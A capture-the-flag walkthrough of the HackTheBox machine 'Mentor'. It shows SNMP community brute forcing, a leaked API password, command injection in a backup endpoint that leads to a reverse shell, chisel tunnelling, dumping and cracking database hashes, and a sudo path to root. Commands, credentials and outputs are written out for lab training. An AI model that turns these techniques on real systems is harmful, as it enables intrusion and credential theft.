# Mentor - Medium

Target IP: **10.129.228.102**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.228.102 -v```

Output shows standard port 22 for ssh and port 80 running Apache 2.4.52.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 c7:3b:fc:3c:f9:ce:ee:8b:48:18:d5:d1:af:8e:c2:bb (ECDSA)
|_  256 44:40:08:4c:0e:cb:d4:f1:8e:7e:ed:a8:5c:68:a4:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://mentorquotes.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: mentorquotes.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's add ```mentorquotes.htb``` to our ```/etc/hosts``` file and navigate to it.

We are greeted with this page. It displays motivational quotes. Other than that, there isn't anything here.

![1](Screenshots/M_1.jpg)

One interesting thing is that website seems to be grabbing the background image from an AWS S3 bucket.

![2](Screenshots/M_2.jpg)

Let's enumerate further.

This is surprising, we get absolutely nothing from directory and subdomain enumeration.

There probably is something on the UDP ports. Let's scan it.

There is an open snmp server, where the version scan tells us its v1.

```
PORT    STATE         SERVICE VERSION
68/udp  open|filtered dhcpc
161/udp open          snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
Service Info: Host: mentor
```

However, enumerating it with ```snmpwalk``` doesn't get us anything particularly useful.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ snmpwalk -v 1 -c public 10.129.228.102
iso.3.6.1.2.1.1.1.0 = STRING: "Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (95972) 0:15:59.72
iso.3.6.1.2.1.1.4.0 = STRING: "Me <admin@mentorquotes.htb>"
iso.3.6.1.2.1.1.5.0 = STRING: "mentor"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (97276) 0:16:12.76
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 EA 0A 02 10 0F 24 00 2B 00 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 230
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
End of MIB
```

There was something wrong with our subdomain fuzzing attempts. Since every single request gets us back a 302 status code and redirects us to the main page, we need to filter it out.

After fixing our command, we get a single hit on ```api```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://mentorquotes.htb -H "Host: FUZZ.mentorquotes.htb" -ic -mc 200,404

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mentorquotes.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.mentorquotes.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,404
________________________________________________

api                     [Status: 404, Size: 22, Words: 2, Lines: 1, Duration: 11ms]
:: Progress: [4989/4989] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

Let's add it to our ```/etc/hosts``` file and navigate.

It tells us "Not Found."

![3](Screenshots/M_3.jpg)

Let's try fuzzing for directories here.

We get some interesting results.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://api.mentorquotes.htb/FUZZ -ic -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://api.mentorquotes.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

docs                    [Status: 200, Size: 969, Words: 194, Lines: 31, Duration: 19ms]
users                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 11ms]
admin                   [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 10ms]
quotes                  [Status: 307, Size: 0, Words: 1, Lines: 1, Duration: 11ms]
redoc                   [Status: 200, Size: 772, Words: 149, Lines: 28, Duration: 9ms]
:: Progress: [87651/87651] :: Job [1/1] :: 769 req/sec :: Duration: [0:01:55] :: Errors: 0 ::
```

Checking ```/docs``` leads us to a page documenting all the API endpoints. From Wappalyzer, we know that this is a FastAPI application.

There is also a potential user, ```james```, with the email ```james@mentorquotes.htb```.

![4](Screenshots/M_4.jpg)

Visiting ```/admin```, ```/users```, and ```/quotes``` tells us that we are missing a header value for authorization to the resource.

![5](Screenshots/M_5.jpg)

Looking back at the API docs, we can send a POST request to sign up for an account at ```/auth/signup``` and log in at ```/auth/login```.

Let's doing that.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ curl -X POST http://api.mentorquotes.htb/auth/signup
           -H "Content-Type: application/json"
           -d '{"email": "hi@hi.htb", "username": "44yyyy", "password": "password"}'
{"id":4,"email":"hi@hi.htb","username":"44yyyy"}
```

Our account is created. I'm noticing that our new account's id is 4, which properly means there are users with id 1, 2, and 3.

Let's log in.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ curl -X POST http://api.mentorquotes.htb/auth/login
           -H "Content-Type: application/json"
           -d '{"email": "hi@hi.htb", "username": "44yyyy", "password": "password"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IjQ0eXl5eSIsImVtYWlsIjoiaGlAaGkuaHRiIn0.AFYF8hkamaNKpmehmz50JJawwbLLhBiCjWH6W1J-3oU"
```

It seems like we are successful, and we get back what I think is an API token.

We can start exploring the functionalities since we now have our token.

Let's capture a request to ```/users/``` with Burp suite. We can then add in the required ```Authorization``` header with our token as the value. The request is successful, but we are lacking privileges. The behavior is the same when we specify the id in the path.

![6](Screenshots/M_6.jpg)

We can view the quotes on ```/quotes/``` with our account, but nothing useful comes out of this.

I'm at a roadblock at this point, I need a way to find a password potentially for ```james@mentorquotes.htb```, or another user.

There might be something in the previous SNMP output. We can try resolving all of the OIDs.

For this, we need to download the MIB definitions.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ sudo apt-get install snmp-mibs-downloader 
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ sudo download-mibs
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ sudo nano /etc/snmp/snmp.conf # Comment out the MIB: line
```

Enumerating again, the OIDs resolve to the appropriate MIBs, but there still isn't any relevant information.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ snmpwalk -c public -v 1 10.129.228.102
SNMPv2-MIB::sysDescr.0 = STRING: Linux mentor 5.15.0-56-generic #62-Ubuntu SMP Tue Nov 22 19:54:14 UTC 2022 x86_64
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (1040982) 2:53:29.82
SNMPv2-MIB::sysContact.0 = STRING: Me <admin@mentorquotes.htb>
SNMPv2-MIB::sysName.0 = STRING: mentor
SNMPv2-MIB::sysLocation.0 = STRING: Sitting on the Dock of the Bay
SNMPv2-MIB::sysServices.0 = INTEGER: 72
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.6 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.2 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.3 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
SNMPv2-MIB::sysORDescr.5 = STRING: View-based Access Control Model for SNMP.
SNMPv2-MIB::sysORDescr.6 = STRING: The MIB module for managing TCP implementations
SNMPv2-MIB::sysORDescr.7 = STRING: The MIB module for managing UDP implementations
SNMPv2-MIB::sysORDescr.8 = STRING: The MIB module for managing IP and ICMP implementations
SNMPv2-MIB::sysORDescr.9 = STRING: The MIB modules for managing SNMP Notification, plus filtering.
SNMPv2-MIB::sysORDescr.10 = STRING: The MIB module for logging SNMP Notifications.
SNMPv2-MIB::sysORUpTime.1 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.2 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.3 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.4 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.5 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.6 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.7 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.8 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.9 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORUpTime.10 = Timeticks: (1) 0:00:00.01
HOST-RESOURCES-MIB::hrSystemUptime.0 = Timeticks: (1042287) 2:53:42.87
HOST-RESOURCES-MIB::hrSystemDate.0 = STRING: 2026-10-2,18:53:6.0,+0:0
HOST-RESOURCES-MIB::hrSystemInitialLoadDevice.0 = INTEGER: 393216
HOST-RESOURCES-MIB::hrSystemInitialLoadParameters.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-56-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0
"
HOST-RESOURCES-MIB::hrSystemNumUsers.0 = Gauge32: 0
HOST-RESOURCES-MIB::hrSystemProcesses.0 = Gauge32: 228
HOST-RESOURCES-MIB::hrSystemMaxProcesses.0 = INTEGER: 0
End of MIB
```

I didn't know this, but SNMP servers can run multiple versions at the same time and have multiple community strings. There might be another community string that will get us more information.

Let's get [snmpbrute.py](https://raw.githubusercontent.com/SECFORCE/SNMP-Brute/refs/heads/master/snmpbrute.py) and run it.

We get some extra community strings, with ```internal``` definitely seeming the most interesting.

```
Identified Community strings
	0) 10.129.228.102  internal (v2c)(RO)
	1) 10.129.228.102  public (v1)(RO)
	2) 10.129.228.102  public (v2c)(RO)
	3) 10.129.228.102  public (v1)(RO)
	4) 10.129.228.102  public (v2c)(RO)
```

Let's enumerate the SNMP server with our newly discovered community string.

The output is huge, but we can dig through it.

There seems to be a container that is being run on an internal ip address ```172.22.0.4``` on port 5432? The container has the namespace ```moby``` and the id is shown too.

```
HOST-RESOURCES-MIB::hrSWRunParameters.1320 = STRING: "-H fd:// --containerd=/run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1668 = STRING: "/usr/local/bin/login.sh"
HOST-RESOURCES-MIB::hrSWRunParameters.1737 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 5432 -container-ip 172.22.0.4 -container-port 5432"
HOST-RESOURCES-MIB::hrSWRunParameters.1751 = STRING: "-namespace moby -id 96e44c5692920491cdb954f3d352b3532a88425979cd48b3959b63bfec98a6f4 -address /run/containerd/containerd.sock"
HOST-RESOURCES-MIB::hrSWRunParameters.1774 = ""
HOST-RESOURCES-MIB::hrSWRunParameters.1852 = STRING: "-proto tcp -host-ip 172.22.0.1 -host-port 8000 -container-ip 172.22.0.3 -container-port 8000"
HOST-RESOURCES-MIB::hrSWRunParameters.1873 = STRING: "-namespace moby -id 0895b9acdf988ca7fff95f04879c0a6285f38ae7e1a578ece768cd2dbc4a23bc -address /run/containerd/containerd.sock"
```

Aha, I think we found what we were looking for.

The parameter that is passed in to ```login.py``` might be the password for ```james```.

```
HOST-RESOURCES-MIB::hrSWRunParameters.2086 = STRING: "/usr/local/bin/login.py kj23sadkj123as0-d213"
```

Let's try authenticating. It works, and we get an API token back.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ curl -X POST http://api.mentorquotes.htb/auth/login
           -H "Content-Type: application/json"
           -d '{"email": "james@mentorquotes.htb", "username": "james", "password": "kj23sadkj123as0-d213"}'
"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImphbWVzIiwiZW1haWwiOiJqYW1lc0BtZW50b3JxdW90ZXMuaHRiIn0.peGpmshcF666bimHkYIBKQN7hj5m785uKcjwbD--Na0"
```

Let's now explore the endpoints.

We can view the users now.

![8](Screenshots/M_8.jpg)

We can also add users and quotes, but it doesn't seem too interesting.

There was an ```/admin``` endpoint that the docs don't tell us about. Let's navigate there.

Our token still works. It seems to tell us about the ```/check``` and ```/backup``` API endpoints.

![9](Screenshots/M_9.jpg)

```/check``` tells us it's not implemented yet.

![10](Screenshots/M_10.jpg)

```/backup``` doesn't allow GET requests.

![11](Screenshots/M_11.jpg)

We need some content in the data section.

![12](Screenshots/M_12.jpg)

Adding a ```{}```, now the response tells us that the ```path``` parameter is missing.

![13](Screenshots/M_13.jpg)

Typing anything as the value of the ```path``` parameter tells us that it's done.

![14](Screenshots/M_14.jpg)

Let's think for a second. If we are supplying the path to something and we are making a backup of it, our input is probably getting passed to a command on the back-end. We could look for command injection here.

Sending a request with a semicolon and a wget call to our http server confirms command injection.

![15](Screenshots/M_15.jpg)

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.228.102 - - [02/Oct/2026 15:45:03] code 404, message File not found
10.129.228.102 - - [02/Oct/2026 15:45:03] "GET //app_backkup.tar HTTP/1.1" 404 -
```

It seems like it's looking for ```/app_backkup.tar```

I tried creating a file that name that actually contains a bash reverse shell then executing to try and get a connection, but it didn't work. The file was transferred and something was ran, but I just got this weird output on my listener.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 20.46.228.235 41898
GET / HTTP/1.1
Host: 209.94.58.69:4444
User-Agent: Mozilla/5.0 zgrab/0.x
Accept: */*
Accept-Encoding: gzip
```

Additionally, it didn't seem like ```curl``` was installed on the remote machine, as connection attempts were failing.

In that case, since we know that python is installed on the machine with the SNMP output showing us a python script that was ran, we can try injecting a python reverse shell. We need to make sure to escape the inner quotation marks too.

The response hangs, which is a good sign.

![16](Screenshots/M_16.jpg)

We get a connection back. It says we are ```root```, but it seems like we are on a container.

```
/app # whoami
root
/app # ls
Dockerfile        app               app_backkup.tar   requirements.txt
```

We are on a ```172.22``` network.

```
/app # ifconfig
eth0      Link encap:Ethernet  HWaddr 02:42:AC:16:00:03  
          inet addr:172.22.0.3  Bcast:172.22.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:274981 errors:0 dropped:0 overruns:0 frame:0
          TX packets:187326 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:40649766 (38.7 MiB)  TX bytes:26281136 (25.0 MiB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:0 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:0 (0.0 B)  TX bytes:0 (0.0 B)
```

There is an ```svc``` directory in ```/home```, and we can read the user flag inside of it.

## Root Flag

Starting privilege escalation here is pretty unfamiliar to me, but let's think. 

We got the user flag in the ```svc``` user's home directory, but we would like to access the user directly. Right now, we have nothing to get ourselves to ```svc```. Additionally, if we find credentials for ```svc```, we could probably log in through ssh.

So let's look for it. There's an interesting directory in ```/app``` that has the source code for the FastAPI application.

```db.py``` tells us about a PostgreSQL server running on ```172.22.0.1``` with the credentials ```postgres:postgres```.

```
/app/app # cat db.py 
import os

from sqlalchemy import (Column, DateTime, Integer, String, Table, create_engine, MetaData)
from sqlalchemy.sql import func
from databases import Database

# Database url if none is passed the default one is used
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:postgres@172.22.0.1/mentorquotes_db")

# SQLAlchemy for quotes
engine = create_engine(DATABASE_URL)
metadata = MetaData()
quotes = Table(
    "quotes",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("title", String(50)),
    Column("description", String(50)),
    Column("created_date", DateTime, default=func.now(), nullable=False)
)

# SQLAlchemy for users
engine = create_engine(DATABASE_URL)
metadata = MetaData()
users = Table(
    "users",
    metadata,
    Column("id", Integer, primary_key=True),
    Column("email", String(50)),
    Column("username", String(50)),
    Column("password", String(128) ,nullable=False)
)


# Databases query builder
database = Database(DATABASE_URL)
```

Let's create a chisel tunnel to interact with the database on our attack box.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ ./chisel_1.12.0_linux_amd64 server --reverse --port 8081
2026/10/02 16:36:41 server: Reverse tunnelling enabled
2026/10/02 16:36:41 server: Fingerprint R1+Wk9e89UXCcsGZs8zj74wejoETFjKphe6S3CeY2fY=
2026/10/02 16:36:41 server: Listening on http://0.0.0.0:8081
2026/10/02 16:37:27 server: session#1: Open (user=- addr=10.129.228.102:51668 remotes=R:127.0.0.1:1080:socks)
2026/10/02 16:37:27 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening

/app # ./chisel_1.12.0_linux_amd64 client 10.10.15.194:8081 R:1080:socks
2026/10/02 20:37:27 client: Connecting to ws://10.10.15.194:8081
2026/10/02 20:37:27 client: Connected (Latency 7.339947ms)
```

We successfully connect to the PostgreSQL server on ```172.22.0.1```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-xzmaisuar7]─[~]
└──╼ [★]$ proxychains psql -h 172.22.0.1 -U postgres
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.22.0.1:5432  ...  OK
Password for user postgres: 
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.22.0.1:5432  ...  OK
psql (17.9 (Debian 17.9-0+deb13u1), server 13.7 (Debian 13.7-1.pgdg110+1))
Type "help" for help.

postgres=# 
```

Let's connect to the ```mentorquotes_db``` database.

```
postgres=# \l
                                                       List of databases
      Name       |  Owner   | Encoding | Locale Provider |  Collate   |   Ctype    | Locale | ICU Rules |   Access privileges   
-----------------+----------+----------+-----------------+------------+------------+--------+-----------+-----------------------
 mentorquotes_db | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 postgres        | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | 
 template0       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/postgres          +
                 |          |          |                 |            |            |        |           | postgres=CTc/postgres
 template1       | postgres | UTF8     | libc            | en_US.utf8 | en_US.utf8 |        |           | =c/postgres          +
                 |          |          |                 |            |            |        |           | postgres=CTc/postgres
(4 rows)

postgres=# \c mentorquotes_db
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.22.0.1:5432  ...  OK
psql (17.9 (Debian 17.9-0+deb13u1), server 13.7 (Debian 13.7-1.pgdg110+1))
You are now connected to database "mentorquotes_db" as user "postgres".
mentorquotes_db=#
```

The users table seems like what we're looking for.

```
mentorquotes_db=# \dt
          List of relations
 Schema |   Name   | Type  |  Owner   
--------+----------+-------+----------
 public | cmd_exec | table | postgres
 public | quotes   | table | postgres
 public | users    | table | postgres
(3 rows)
```

There it is! We get the password hashes for the accounts.

```
mentorquotes_db=# SELECT * FROM users;
 id |         email          |  username   |             password             
----+------------------------+-------------+----------------------------------
  1 | james@mentorquotes.htb | james       | 7ccdcd8c05b59add9c198d492b36a503
  2 | svc@mentorquotes.htb   | service_acc | 53f22d0dfa10dce7e29cd31f4f953fd8
  4 | hi@hi.htb              | 44yyyy      | 5f4dcc3b5aa765d61d8327deb882cf99
(3 rows)
```

Let's try cracking the hash for ```svc```.

Hashcat is successful.

```
53f22d0dfa10dce7e29cd31f4f953fd8:123meunomeeivani
```

Let's log in through ssh.

We're in. Finally!

```
svc@mentor:~$ whoami
svc
```

We can't run ```sudo``` as ```svc```.

There is another user ```james``` that we are probably looking to laterally move to.

```
svc@mentor:/home$ ls
james  svc
```

Inside ```/usr/local/bin```, we see the login scripts we saw before. This is pretty interesting because they are the only elements that are owned by ```svc```.

```
svc@mentor:/usr/local/bin$ ls -la
total 68
drwxr-xr-x  2 root root 4096 Jun 12  2022 .
drwxr-xr-x 10 root root 4096 Jun  3  2022 ..
-rwxr-xr-x  1 root root  207 Jun  3  2022 dotenv
-rwxr-xr-x  1 root root  214 Jun  3  2022 email_validator
-rwxr-xr-x  1 root root  219 Jun  3  2022 epylint
-rwxr-xr-x  1 root root  208 Jun  3  2022 flask
-rwxr-xr-x  1 root root  209 Jun  3  2022 isort
-rwxr-xr-x  1 root root  243 Jun  3  2022 isort-identify-imports
-rwxr-xr-x  1 svc  svc   414 Jun  7  2022 login.py
-rwxr-xr-x  1 svc  svc   103 Jun 12  2022 login.sh
-rwxr-xr-x  1 root root  244 Jun  3  2022 normalizer
-rwxr-xr-x  1 root root  217 Jun  3  2022 pylint
-rwxr-xr-x  1 root root  223 Jun  3  2022 pyreverse
-rwxr-xr-x  1 root root  221 Jun  3  2022 py.test
-rwxr-xr-x  1 root root  221 Jun  3  2022 pytest
-rwxr-xr-x  1 root root  219 Jun  3  2022 symilar
-rwxr-xr-x  1 root root  209 Jun  3  2022 watchgod
```

Searching for config files with the string "pass" inside, we find a cleartext password inside ```/etc/snmp/snmp.conf```.

```
svc@mentor:~$ find / -type f -name "*.conf" -exec grep -i "pass" {} + 2>/dev/null
SNIP...
/etc/snmp/snmpd.conf:createUser bootstrap MD5 SuperSecurePassword123__ DES
SNIP...
```

Let's try this password to switch users to ```james```.

It works!

```
svc@mentor:~$ su - james
Password: 
james@mentor:~$ whoami
james
```

James can run ```/bin/sh``` as root.

```
james@mentor:~$ sudo -l
[sudo] password for james: 
Matching Defaults entries for james on mentor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User james may run the following commands on mentor:
    (ALL) /bin/sh
```

Let's do exactly that to get a shell as ```root```.

```
james@mentor:~$ sudo /bin/sh
# whoami
root
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
